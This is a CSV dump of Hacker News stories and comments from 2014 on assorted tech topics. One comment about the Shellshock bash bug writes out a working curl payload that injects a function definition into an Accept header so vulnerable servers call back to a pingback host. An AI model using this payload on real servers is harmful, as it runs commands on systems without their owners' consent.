ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
8364104,comment,8363889,8363901,3,0,jimiasty,,,"Hi there,\nthis is Jakub, Co-Founder of Estimote (YC S13).\nOur Indoor Location SDK was designed specifically for Estimote Beacons (the bigger one with bigger battery, not the stickers). Estimote Beacons with their adhesive layer were designed to be sticked to walls vertically. Thanks to their position and antenna orientation we are able to &quot;estimate&quot; position of the user inside the building. Indoor location is also power-consuming for beacons while they broadcast a bit more often, so we can do better math while analyzing data.\nStickers were designed for movable objects with much shorter range and a bit longer advertising intervals.",1411592378
8364103,comment,8363738,8364055,9,0,michaelmior,,,"SDS[0] from the creator of Redis is also useful. It doesn&#x27;t do reference counting, but is helpful for many other string manipulation issues.<p>[0] <a href=""https://github.com/antirez/sds"" rel=""nofollow"">https://github.com/antirez/sds</a>",1411592368
8364101,story,,,2,0,fks,"Monkey Patches and MP3s – Exploring Dangerous Design Patterns in Node.js",http://fredkschott.com/post/2014/09/nodejs-dangerous-module-design-patterns/,,1411592345
8364100,comment,8363648,8364034,1,0,sachinag,,,"A winner is you, my friend.",1411592336
8364099,story,,,5,0,jamesgpearce,"Testing Flux Applications",http://facebook.github.io/react/blog/2014/09/24/testing-flux-applications.html,,1411592326
8364098,comment,8362099,8363858,1,0,Swizec,,,"I too build modern async web apps for a living and I think anyone who says it&#x27;s not hard (or at least complex) is either lying or in denial.<p>And there&#x27;s eCommerce and then there&#x27;s eCommerce. Recurring weekly subscriptions with moving parts are <i>hard</i>. Amazon Subscribe&Save is a mess and I haven&#x27;t heard of anyone who&#x27;s had a good experience with that. And Amazon probably devoted much more engineering power to that problem than people at a startup can.<p>Sometimes hardness isn&#x27;t a result of poor design, but the result of things being complex. Especially if (as in a startup) your definition of &quot;things&quot; is changing rapidly because you&#x27;re still not sure what exactly you are building.",1411592318
8364097,comment,8363252,8364070,2,0,rjbrock,,,"It does seem like it should be faster, but this isn&#x27;t a vanilla export/import.  He is going from unstructured to (I assume) structured data.  So he needs to deduplicate and possibly do other operations on the data before importing",1411592307
8364095,comment,8363197,8363442,2,0,scrollaway,,,"I have indeed lived in europe and what sounds ludicrous to me is that people not only have to deal with this but accept it as the norm. What the hell do landlords get out of this? The joy of having to run to the bank every xth of the month?<p>I don&#x27;t know about you but my bank is more like a public toilet than a bakery. I wouldn&#x27;t go there unless there was an emergency, and even if there was I&#x27;d consider a dark alley over it.<p>(brought to you by the Department of drawn out metaphors)",1411592284
8364094,comment,8361574,8362917,2,0,peterwwillis,,,"Routers definitely have shells, it&#x27;s just a matter of whether it&#x27;s bash or something else that might also be vulnerable.",1411592254
8364093,story,,,1,0,thejteam,"Hydrocarbons Unleash an Angry God",http://www.betterlivingthroughbeowulf.com/hydrocarbons-unleash-an-angry-god/,,1411592247
8364092,story,,,3,0,ddispaltro,"How to model a doorknob, functionally",http://pchiusano.blogspot.com/2013/09/how-to-model-doorknob-functionally.html,,1411592234
8364091,comment,8361574,8361574,3,0,gwillem,,,"This is quite stealthy way to scan, as Accept headers are generally not logged:<p><pre><code>    curl -H &#x27;Accept: () { :;}; /usr/bin/curl -so /dev/null http://my.pingback.com&#x27; \n</code></pre>\nFound nothing so far though. IMHO the number of Bash CGI scripts in the wild must be pretty low.",1411592229
